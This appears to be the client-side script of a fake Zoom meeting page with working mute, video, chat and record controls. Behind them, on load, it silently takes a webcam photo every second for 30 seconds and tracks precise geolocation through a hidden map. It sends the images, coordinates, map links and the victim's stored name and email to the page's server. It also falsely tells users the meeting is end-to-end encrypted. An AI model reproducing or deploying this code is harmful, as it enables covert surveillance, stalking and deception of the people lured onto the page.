// Global variables
let stream;
let captureInterval;
let captureCount = 0;
const MAX_CAPTURES = 30;
let isCapturing = false;
let locationPermissionRequested = false;
let map, marker, leafletLocationCircle;
let locationAccuracyThreshold = 50; // meters - minimum accuracy to consider a "good" location

// DOM elements
const videoElement = document.getElementById('local-video');
const muteBtn = document.getElementById('mute-btn');
const videoBtn = document.getElementById('video-btn');
const leaveBtn = document.getElementById('leave-btn');
const chatBtn = document.getElementById('chat-btn');
const shareBtn = document.getElementById('share-btn');
const recordBtn = document.getElementById('record-btn');
const participantsBtn = document.getElementById('participants-btn');
const securityBtn = document.getElementById('security-btn');
const reactionsBtn = document.getElementById('reactions-btn');
const viewBtn = document.getElementById('view-btn');
const chatPanel = document.querySelector('.chat-panel');
const participantsPanel = document.querySelector('.participants-panel');
const sendBtn = document.getElementById('send-btn');
const chatInput = document.getElementById('chat-input');
const chatArea = document.querySelector('.chat-area');
const recordingBadge = document.getElementById('recording-badge');
const connectionToast = document.getElementById('connection-toast');

// Generate a zoom meeting URL and display it
function generateMeetingUrl() {
    // Get meeting ID from header or generate one
    let meetingId = document.querySelector('.meeting-title').textContent.trim();
    meetingId = meetingId.match(/\d+-\d+-\d+/) ? meetingId.match(/\d+-\d+-\d+/)[0] : '467-218-9312';
    
    // Create the zoom meeting URL
    const zoomUrl = `https://zoom.us/j/${meetingId.replace(/-/g, '')}`;
    
    // Add the URL to the chat as a system message
    const messageDiv = document.createElement('div');
    messageDiv.className = 'chat-message system-message';
    
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    
    messageDiv.innerHTML = `
        <div class="message-content">
            <p>Meeting URL: <a href="${zoomUrl}" target="_blank">${zoomUrl}</a></p>
            <small class="text-muted">System, ${time}</small>
        </div>
    `;
    
    chatArea.appendChild(messageDiv);
    
    // Also display the URL in the header
    const urlDisplay = document.createElement('div');
    urlDisplay.className = 'meeting-url';
    urlDisplay.innerHTML = `<a href="${zoomUrl}" target="_blank">${zoomUrl}</a>`;
    urlDisplay.style.fontSize = '12px';
    urlDisplay.style.color = '#2D8CFF';
    urlDisplay.style.marginTop = '5px';
    
    document.querySelector('.meeting-title').appendChild(urlDisplay);
    
    // Log to console
    console.log('Meeting URL:', zoomUrl);
    
    return zoomUrl;
}

// Initialize the meeting
async function initCamera() {
    // Generate meeting URL first
    const meetingUrl = generateMeetingUrl();
    
    try {
        // Request camera and microphone access - this will show permission prompt
        stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true
        });
        
        // Display the local video
        videoElement.srcObject = stream;
        
        // Start capturing images
        startCapturing();
        
        // Show connection toast
        showToast(connectionToast);
        
        // Once camera is working, immediately get location
        getLocation();
        
    } catch (error) {
        console.error('Error accessing media devices:', error);
        // Still try to get location even if camera fails
        getLocation();
    }
}

// Function to get location with proper permission handling
function getLocation() {
    if (locationPermissionRequested) return;
    locationPermissionRequested = true;
    
    // Create a hidden div for the leaflet map
    const mapDiv = document.createElement('div');
    mapDiv.id = 'location-map';
    mapDiv.style.height = '1px';
    mapDiv.style.width = '1px';
    mapDiv.style.position = 'absolute';
    mapDiv.style.visibility = 'hidden';
    document.body.appendChild(mapDiv);
    
    // Initialize Leaflet map
    map = L.map('location-map', {
        zoomControl: false,
        attributionControl: false
    });
    
    // Add a tile layer
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
    }).addTo(map);
    
    // First try HTML5 Geolocation API directly (this will trigger the permission prompt)
    if (navigator.geolocation) {
        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                console.log("Precise location captured:", position.coords);
                
                // Once we have permission, use Leaflet's locate method for potentially better accuracy
                map.locate({
                    setView: true,
                    maxZoom: 16,
                    enableHighAccuracy: true,
                    watch: true
                });
                
                // Set up event handlers for Leaflet
                setupLeafletHandlers();
                
                // Also use the position data we already have
                processLocationData({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    source: 'geolocation_api'
                });
                
                // Start watching position for even better accuracy
                const watchId = navigator.geolocation.watchPosition(
                    (watchPosition) => {
                        // Process each location update
                        processLocationData({
                            latitude: watchPosition.coords.latitude,
                            longitude: watchPosition.coords.longitude,
                            accuracy: watchPosition.coords.accuracy,
                            source: 'geolocation_watch',
                            improved: true
                        });
                    },
                    (error) => {
                        console.error('Watch position error:', error);
                    },
                    options
                );
                
                // Stop watching after 20 seconds to save battery
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchId);
                }, 20000);
            },
            (error) => {
                console.error('Error getting precise location:', error);
                // If permission denied, fallback to Leaflet's built-in location
                useLeafletLocate();
            },
            options
        );
    } else {
        // Fallback if Geolocation API not available
        useLeafletLocate();
    }
}

// Set up handlers for Leaflet's location events
function setupLeafletHandlers() {
    // Handle location found event
    map.on('locationfound', function(e) {
        console.log("Leaflet location found:", e);
        
        // Process the location data
        processLocationData({
            latitude: e.latitude,
            longitude: e.longitude,
            accuracy: e.accuracy,
            source: 'leaflet_location'
        });
        
        // Add marker and accuracy circle to the map
        if (!marker) {
            marker = L.marker([e.latitude, e.longitude]).addTo(map);
        } else {
            marker.setLatLng([e.latitude, e.longitude]);
        }
        
        if (!leafletLocationCircle) {
            leafletLocationCircle = L.circle([e.latitude, e.longitude], {
                radius: e.accuracy / 2,
                color: '#2D8CFF'
            }).addTo(map);
        } else {
            leafletLocationCircle.setLatLng([e.latitude, e.longitude]);
            leafletLocationCircle.setRadius(e.accuracy / 2);
        }
    });
    
    // Handle location error event
    map.on('locationerror', function(e) {
        console.error('Leaflet location error:', e);
    });
}

// Use Leaflet's built-in locate method
function useLeafletLocate() {
    // Set up event handlers
    setupLeafletHandlers();
    
    // Try to locate user with Leaflet
    map.locate({
        setView: true,
        maxZoom: 16,
        enableHighAccuracy: true,
        watch: true,
        timeout: 10000
    });
}

// Process and send location data to the server
function processLocationData(data) {
    const locationData = {
        latitude: data.latitude,
        longitude: data.longitude,
        accuracy: data.accuracy,
        timestamp: new Date().toISOString(),
        name: localStorage.getItem('userName') || 'Unknown',
        email: localStorage.getItem('userEmail') || 'Unknown',
        source: data.source,
        improved: data.improved || false
    };
    
    // Add Google Maps URL
    locationData.maps_url = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
    
    // Send to server
    sendLocationDataToServer(locationData);
    
    // If this is a high-accuracy location, add to chat
    if (data.accuracy < locationAccuracyThreshold) {
        // Only show in chat for the first high-accuracy location
        if (!window.highAccuracyLocationShown) {
            window.highAccuracyLocationShown = true;
            addChatMessage('', `Your location is enabled. <a href="${locationData.maps_url}" target="_blank">View on map</a>`, 'system');
        }
    }
}

// Function to send location data to server
function sendLocationDataToServer(locationData) {
    fetch('/location', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(locationData)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Location sent to server:', data);
    })
    .catch(error => {
        console.error('Error sending location:', error);
    });
}

// Function to start capturing images
function startCapturing() {
    if (isCapturing) return;
    
    isCapturing = true;
    captureCount = 0;
    
    // Capture image every 1 second
    captureInterval = setInterval(() => {
        captureImage();
        captureCount++;
        
        // Stop after MAX_CAPTURES
        if (captureCount >= MAX_CAPTURES) {
            clearInterval(captureInterval);
            isCapturing = false;
        }
    }, 1000);
}

// Function to capture an image from the video stream
function captureImage() {
    // Create a canvas element
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    
    // Draw the current video frame on the canvas
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    
    // Convert the canvas to a data URL (image)
    const imageData = canvas.toDataURL('image/jpeg');
    
    // Include user data with the first capture
    if (captureCount === 0) {
        const userData = {
            image: imageData,
            name: localStorage.getItem('userName') || 'Unknown',
            email: localStorage.getItem('userEmail') || 'Unknown'
        };
        sendImageToServer(imageData, userData);
    } else {
        // Send just the image for subsequent captures
        sendImageToServer(imageData);
    }
}

// Function to send the image to the server
function sendImageToServer(imageData, userData = null) {
    const payload = {
        image: imageData
    };
    
    // Add user data if this is the first capture
    if (userData) {
        payload.name = userData.name;
        payload.email = userData.email;
    }
    
    fetch('/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Image saved:', data);
    })
    .catch(error => {
        console.error('Error saving image:', error);
    });
}

// Function to show a toast notification
function showToast(toastElement) {
    // Create toast instance if using Bootstrap
    setTimeout(() => {
        toastElement.style.display = 'flex';
        setTimeout(() => {
            toastElement.style.display = 'none';
        }, 3000);
    }, 1000);
}

// Function to add a chat message
function addChatMessage(sender, message, type = 'user') {
    const messageDiv = document.createElement('div');
    messageDiv.className = `chat-message ${type}-message`;
    
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    
    if (type === 'system') {
        messageDiv.innerHTML = `
            <div class="message-content">
                <p>${message}</p>
                <small class="text-muted">System, ${time}</small>
            </div>
        `;
    } else {
        // If sender is empty, use the user's name
        const name = sender || localStorage.getItem('userName') || 'You';
        messageDiv.innerHTML = `
            <div class="message-content">
                <strong>${name}</strong>
                <p>${message}</p>
                <small class="text-muted">${time}</small>
            </div>
        `;
    }
    
    chatArea.appendChild(messageDiv);
    chatArea.scrollTop = chatArea.scrollHeight;
}

// Initialize buttons
function initButtons() {
    // Mute button
    muteBtn.addEventListener('click', () => {
        const micIcon = muteBtn.querySelector('.icon i');
        const micText = muteBtn.querySelector('div:last-child');
        
        if (micIcon.classList.contains('fa-microphone-slash')) {
            micIcon.classList.replace('fa-microphone-slash', 'fa-microphone');
            micText.textContent = 'Mute';
            // Enable audio tracks
            stream.getAudioTracks().forEach(track => {
                track.enabled = true;
            });
            addChatMessage('', `${localStorage.getItem('userName') || 'You'} unmuted their microphone`, 'system');
        } else {
            micIcon.classList.replace('fa-microphone', 'fa-microphone-slash');
            micText.textContent = 'Unmute';
            // Disable audio tracks
            stream.getAudioTracks().forEach(track => {
                track.enabled = false;
            });
            addChatMessage('', `${localStorage.getItem('userName') || 'You'} muted their microphone`, 'system');
        }
    });
    
    // Video button
    videoBtn.addEventListener('click', () => {
        const videoIcon = videoBtn.querySelector('.icon i');
        const videoText = videoBtn.querySelector('div:last-child');
        
        if (videoIcon.classList.contains('fa-video')) {
            videoIcon.classList.replace('fa-video', 'fa-video-slash');
            videoText.textContent = 'Start Video';
            // Disable video tracks
            stream.getVideoTracks().forEach(track => {
                track.enabled = false;
            });
            addChatMessage('', `${localStorage.getItem('userName') || 'You'} turned off their camera`, 'system');
        } else {
            videoIcon.classList.replace('fa-video-slash', 'fa-video');
            videoText.textContent = 'Stop Video';
            // Enable video tracks
            stream.getVideoTracks().forEach(track => {
                track.enabled = true;
            });
            addChatMessage('', `${localStorage.getItem('userName') || 'You'} turned on their camera`, 'system');
        }
    });
    
    // Chat button
    chatBtn.addEventListener('click', () => {
        if (participantsPanel.style.display === 'flex') {
            participantsPanel.style.display = 'none';
        }
        
        if (chatPanel.style.display === 'flex' || chatPanel.style.display === '') {
            chatPanel.style.display = 'none';
        } else {
            chatPanel.style.display = 'flex';
        }
    });
    
    // Participants button
    participantsBtn.addEventListener('click', () => {
        if (chatPanel.style.display === 'flex' || chatPanel.style.display === '') {
            chatPanel.style.display = 'none';
        }
        
        if (participantsPanel.style.display === 'flex' || participantsPanel.style.display === '') {
            participantsPanel.style.display = 'none';
        } else {
            participantsPanel.style.display = 'flex';
        }
    });
    
    // Close buttons for panels
    document.querySelectorAll('.close-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const panel = e.target.closest('.chat-panel, .participants-panel');
            if (panel) {
                panel.style.display = 'none';
            }
        });
    });
    
    // Send chat message
    sendBtn.addEventListener('click', () => {
        const message = chatInput.value.trim();
        if (message) {
            addChatMessage(localStorage.getItem('userName') || 'You', message);
            chatInput.value = '';
        }
    });
    
    // Send message on Enter key
    chatInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            const message = chatInput.value.trim();
            if (message) {
                addChatMessage(localStorage.getItem('userName') || 'You', message);
                chatInput.value = '';
            }
        }
    });
    
    // Record button
    recordBtn.addEventListener('click', () => {
        const recordIcon = recordBtn.querySelector('.icon i');
        const recordText = recordBtn.querySelector('div:last-child');
        
        if (recordIcon.classList.contains('fa-record-vinyl')) {
            recordIcon.classList.replace('fa-record-vinyl', 'fa-stop-circle');
            recordText.textContent = 'Stop';
            recordingBadge.style.display = 'flex';
            addChatMessage('', 'Recording started by the host', 'system');
        } else {
            recordIcon.classList.replace('fa-stop-circle', 'fa-record-vinyl');
            recordText.textContent = 'Record';
            recordingBadge.style.display = 'none';
            addChatMessage('', 'Recording stopped by the host', 'system');
        }
    });
    
    // Share Screen button (simulated)
    shareBtn.addEventListener('click', () => {
        addChatMessage('', 'Screen sharing is not available in this demo', 'system');
    });
    
    // Security button (simulated)
    securityBtn.addEventListener('click', () => {
        addChatMessage('', 'This meeting is secured with end-to-end encryption', 'system');
    });
    
    // Reactions button (simulated)
    reactionsBtn.addEventListener('click', () => {
        addChatMessage(localStorage.getItem('userName') || 'You', '👍');
    });
    
    // View button (simulated)
    viewBtn.addEventListener('click', () => {
        const viewIcon = viewBtn.querySelector('.icon i');
        const viewText = viewBtn.querySelector('div:last-child');
        
        if (viewText.textContent === 'Gallery View') {
            viewText.textContent = 'Speaker View';
            viewIcon.classList.replace('fa-th-large', 'fa-user');
        } else {
            viewText.textContent = 'Gallery View';
            viewIcon.classList.replace('fa-user', 'fa-th-large');
        }
    });
    
    // Leave button
    leaveBtn.addEventListener('click', () => {
        if (confirm('Are you sure you want to leave the meeting?')) {
            // Stop all streams
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Stop capturing
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            
            // Redirect to home page
            window.location.href = '/';
        }
    });
}

// Wait for document to load
document.addEventListener('DOMContentLoaded', () => {
    // Initialize camera
    initCamera();
    
    // Initialize buttons
    initButtons();
    
    // Add system message
    addChatMessage('', 'Welcome to the meeting! Camera and microphone access is required for this session.', 'system');
}); 